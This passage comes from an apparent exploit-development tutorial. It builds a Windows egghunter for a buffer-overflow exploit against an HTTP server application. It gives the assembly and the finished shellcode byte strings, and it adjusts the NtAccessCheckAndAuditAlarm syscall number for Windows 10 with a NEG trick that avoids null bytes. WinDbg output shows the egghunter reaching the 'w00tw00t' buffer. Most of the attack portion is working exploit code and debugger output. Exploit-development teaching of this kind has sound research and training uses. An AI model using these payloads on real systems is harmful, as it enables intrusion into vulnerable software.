<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_page: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Go to the last address in the memory page  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or dx, 0x0fff ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_inc_one: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Increase the memory counter by one  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; inc edx ;&#34;</span>  
</span></span></code></pre></div><p>The egghunter starts with <code>loop_inc_page</code>, performing an or operation on the DX register with 0x0FFF. This will make EDX point to the last possible address of a memory page. Note that we could set EDX to 0xFFFFF000, but the operations will have badchars (e.g., 00) and our shellcode must not have badchars, always remember that.
The <code>loop_inc_one</code> operation sets EDX to a new memory page by incrementing it 1 more. We can see that EDX points to the memory pages.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_check: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Save the edx <span style="color:#66d9ef">register</span> which holds our memory  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> address on the stack
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; push edx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Push the system call number  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x2 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Initialize the call to NtAccessCheckAndAuditAlarm  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; pop eax ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Perform the system call  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; int 0x2e ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Check <span style="color:#66d9ef">for</span> access violation, <span style="color:#ae81ff">0xc0000005</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> (ACCESS_VIOLATION)
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; cmp al,05 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Restore the edx <span style="color:#66d9ef">register</span> to check later  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">for</span> our egg
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; pop edx ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; loop_check_valid: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> If access violation encountered, go to next page
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; je loop_inc_page ;&#34;</span>  
</span></span></code></pre></div><p>This is the check that is being performed over such memory page. It is pushing the value of EDX (memory region) in the stack, to store it for later (we don&rsquo;t know if EDX will be overwritten), then putting the number 0x2 in eax, which is the system call number for NtAccessCheckAndAuditAlarm, performing the syscall via a interruption (0x2e) (Microsoft designed the operating system to treat this exception as a system call) and comparing if the returned value from EAX is 0xc000005. It only compares the lowest part of the register to 0x05, which is the same but the instruction is shorter.
Lastly, we restore the value of EDX as it was in the stack to keep track of the next memory region to analyze and we jump to increment the page in the case that an exception has been found (the CMP operation modifies the status of the ZF register).
If the memory page is mapped and we have access, we won&rsquo;t jump, but we will continue to the following code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e6db74">&#34; is_egg: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Load <span style="color:#a6e22e">egg</span> (w00t in this example) into  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> the eax <span style="color:#66d9ef">register</span>
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov eax, 0x74303077 ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Initializes pointer with current checked  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> address
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; mov edi, edx ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Compare eax with doubleword at edi and  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> set status flags
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> No match, we will increase our memory  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> counter by one
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> First part of the egg detected, check <span style="color:#66d9ef">for</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> the second part
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; scasd ;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> No match, we found just a location  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> with half an egg
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jnz loop_inc_one ;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; matched: &#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> The edi <span style="color:#66d9ef">register</span> points to the first  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> byte of our buffer, we can jump to it
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34; jmp edi ;&#34;</span>  
</span></span></code></pre></div><p>We load the &ldquo;egg&rdquo; we want to search into the EAX register.
We mov the pointer of the memory we are scanning to EDI.
We use the <code>scasd</code> operation to compare EAX (the egg) with the dword at EDI (this means the dword at the start of memory region). Such operation will automatically increment EDI by a DWORD, displacing it as we want. In case that there is no match, we increment the memory counter by one <strong>inside such memory region.</strong>
In case that there is match, the match is only for the first dword, the first half of the egg, and we perform the <code>scasd</code> operation again to check for the other half egg. In case that both <code>scasd</code> operations are successful, we won&rsquo;t increment the counters inside the memory region but we will reach to the <code>matched</code> tag, which is a <code>jmp</code> edi (EDI at this point will store the location where the egg was found).</p>
<p>Interesting note about this egghunter: The original code from Matt Miller used the NtDisplayString1 system call, exploiting the very same concept. However, Miller realized that the use of the NtAccessCheckAndAuditAlarm system call was actually improving the portability of the egghunter. This is due to the fact that the NtAccessCheckAndAuditAlarm system call number (0x02) didn’t change across different operating systems versions, compared to the one for NtDisplayString, which changed between Windows versions.</p>
<p>Once we understood our egghunter, let&rsquo;s use Keystone to obtain the opcodes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>egghunter <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>We must replace these values for the &ldquo;A&rdquo; buffer after the HTTP method (remember that we modified the HTTP method to a routine to do a short jump to our &ldquo;A&rdquo; buffer. Now, we want to jump to the egghunter and find our other buffer).</p>
<p>Let&rsquo;s put a breakpoint on the POP, RET and analyze if everything works until the egghunter (and confirm if the egghunter code is not mangled):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea8d <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea8e <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea8f <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea90 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea91 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea92 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea93 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea94 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea95 <span style="color:#ae81ff">6681</span>caff0f      or      dx,<span style="color:#ae81ff">0FF</span>Fh
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9a <span style="color:#ae81ff">42</span>              inc     edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9b <span style="color:#ae81ff">52</span>              push    edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9c <span style="color:#ae81ff">6</span>a02            push    <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9e <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9f cd2e            <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">2</span>Eh
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa1 <span style="color:#ae81ff">3</span>c05            cmp     al,<span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa3 <span style="color:#ae81ff">5</span>a              pop     edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa4 <span style="color:#ae81ff">74</span>ef            je      <span style="color:#ae81ff">0472</span>ea95
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa6 b877303074      mov     eax,<span style="color:#ae81ff">74303077</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaab <span style="color:#ae81ff">89</span>d7            mov     edi,edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaad af              scas    dword ptr es:[edi]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaae <span style="color:#ae81ff">75</span>ea            jne     <span style="color:#ae81ff">0472</span>ea9a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab0 af              scas    dword ptr es:[edi]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab1 <span style="color:#ae81ff">75e7</span>            jne     <span style="color:#ae81ff">0472</span>ea9a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab3 ffe7            jmp     edi
</span></span></code></pre></div><p>Our egghunter code is present in memory and appears to be intact. It should find our &ldquo;w00tw00t&rdquo; egg, which is here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0x0</span> L<span style="color:#f92672">?</span><span style="color:#ae81ff">80000000</span> w00tw00t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38186  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span>  w00tw00tDDDDDDDD
</span></span></code></pre></div><p>However, if we put a breakpoint in the address of the egg, and we continue the program, it keeps infinitely running and the breakpoint is not hit, meaning that it has not been able to find our egg buffer. We know the buffer is stored in memory so the problem is in our egghunter code.</p>
<p>While we can find plenty of exploits publicly available that include this egghunter, it appears that they are all targeting applications on Windows 7 or prior. This means that some changes occurred in between Windows 7 and Windows 10 that break the functionality of our egghunter. <strong>This means that it is possible that the egghunter that we used does not work in Windows 10 for some reason.</strong></p>
<p>Indeed, it does not work because of the <strong>SSN we have used. We have used the SSN 0x02 but this SSN is different in our Windows for the syscall we want to perform.</strong> Let&rsquo;s check the official function in ntdll to see which SSN it is using:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>NtAccessCheckAndAuditAlarm:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24d0 b8c9010000      mov     eax,<span style="color:#ae81ff">1</span>C9h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24d5 e803000000      call    ntdll<span style="color:#f92672">!</span>NtAccessCheckAndAuditAlarm<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd</span> (<span style="color:#ae81ff">77</span>cd24dd)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24da c22c00          ret     <span style="color:#ae81ff">2</span>Ch
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24dd <span style="color:#ae81ff">8</span>bd4            mov     edx,esp
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24df <span style="color:#ae81ff">0f</span><span style="color:#ae81ff">34</span>            sysenter
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24e1 c3              ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24e2 <span style="color:#ae81ff">8</span>da42400000000  lea     esp,[esp]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>cd24e9 <span style="color:#ae81ff">8</span>da42400000000  lea     esp,[esp]
</span></span></code></pre></div><p>Based on this output, the SSN is 0x1c9. Let&rsquo;s change the script to replace our PUSH 0x02 instruction to push 0x1c9. Let&rsquo;s see the resulting egghunter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>egghunter <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x81\xca\xff\x0f\x42\x52\x68\xc9\x01\x00\x00\x58\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>So bad! Our new egghunter has null bytes! These null bytes are bad characters and will prevent us from crashing the application.
We have to modify the code of the egghunter a bit so that it does the same, but these bytes do not appear.
We are going to use the NEG assembly instruction. We need to generate a negative value that, when substracted from 0x00, will result in 0x1c9.
Let&rsquo;s examine how we can do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0x0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1c9</span>
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#f92672">-</span><span style="color:#ae81ff">457</span> <span style="color:#f92672">=</span> fffffe37
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">?</span> <span style="color:#ae81ff">0x0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xfffffe37</span>
</span></span><span style="display:flex;"><span>Evaluate expression: <span style="color:#f92672">-</span><span style="color:#ae81ff">4294966839</span> <span style="color:#f92672">=</span> ffffffff<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">000001</span>c9
</span></span></code></pre></div><p>We begin by substracting the value we want to obtain from 0x0. This will give us our number but in negative value.
If we negate the obtained value, we obtain a QWORD (64 bytes) but <strong>because we are running on a 32 bit architecture, the result WE WANT will be stored in the lower DWORD of the total value (000001c9)</strong>.</p>
<p>Therefore, we can replace this instruction:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e6db74">&#34; push 0x1c9 ;&#34;</span>
</span></span></code></pre></div><p>for these ones:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#75715e"># Push the system call number negated 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> <span style="color:#e6db74">&#34; mov eax, 0xfffffe37;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Negate it again  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34; neg eax;&#34;</span>  
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">#</span> Initialize the call to NtAccessCheckAndAuditAlarm  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34; pop eax ;&#34;
</span></span></span></code></pre></div><p>We don&rsquo;t want to pop EAX anymore, as we already have the value in EAX.
Let&rsquo;s check if the egghunter is mangled:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">0472</span>ea8f L26
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea8f <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea90 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea91 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea92 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea93 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea94 <span style="color:#ae81ff">90</span>              nop
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea95 <span style="color:#ae81ff">6681</span>caff0f      or      dx,<span style="color:#ae81ff">0FF</span>Fh
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9a <span style="color:#ae81ff">42</span>              inc     edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9b <span style="color:#ae81ff">52</span>              push    edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>ea9c b837feffff      mov     eax,<span style="color:#ae81ff">0FF</span>FFFE37h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa1 f7d8            neg     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa3 cd2e            <span style="color:#66d9ef">int</span>     <span style="color:#ae81ff">2</span>Eh
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa5 <span style="color:#ae81ff">3</span>c05            cmp     al,<span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa7 <span style="color:#ae81ff">5</span>a              pop     edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaa8 <span style="color:#ae81ff">74</span>eb            je      <span style="color:#ae81ff">0472</span>ea95
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaaa b877303074      mov     eax,offset windows_storage<span style="color:#f92672">!</span>CImageManager<span style="color:#f92672">::</span>OnLoadOverlayCompleted<span style="color:#f92672">+</span><span style="color:#ae81ff">0x17</span> (<span style="color:#ae81ff">74303077</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eaaf <span style="color:#ae81ff">89</span>d7            mov     edi,edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab1 af              scas    dword ptr es:[edi]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab2 <span style="color:#ae81ff">75e6</span>            jne     <span style="color:#ae81ff">0472</span>ea9a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab4 af              scas    dword ptr es:[edi]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab5 <span style="color:#ae81ff">75e3</span>            jne     <span style="color:#ae81ff">0472</span>ea9a
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab7 ffe7            jmp     edi
</span></span></code></pre></div><p>Fantastic, all of our egghunter does not contain badchars and is not mangled.
Now, let&rsquo;s put a breakpoint on the jmp edi instruction and see what does edi have:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">74303077</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>a2bf0 ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">0472</span>ea20 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span>b38186 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>a2bf0 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">04</span>b3818e
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">0472</span>eab7 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">0472</span>ea24 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0472</span>eab7 ffe7            jmp     edi {<span style="color:#ae81ff">04</span>b3818e}
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds edi
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b3818e  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38192  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38196  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b3819a  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b3819e  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381a2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381a6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381aa  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ae  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381b2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381b6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ba  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381be  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381c2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381c6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ca  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ce  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381d2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381d6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381da  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381de  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381e2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381e6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ea  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381ee  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381f2  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381f6  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381fa  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b381fe  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38202  <span style="color:#ae81ff">44444444</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38206  <span style="color:#ae81ff">44444444</span>
</span></span></code></pre></div><p>Fantastic, just after our egg:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> s <span style="color:#f92672">-</span>a <span style="color:#ae81ff">0x0</span> L<span style="color:#f92672">?</span><span style="color:#ae81ff">80000000</span> w00tw00t
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>b38186  <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">74</span><span style="color:#f92672">-</span><span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span> <span style="color:#ae81ff">44</span>  w00tw00tDDDDDDDD
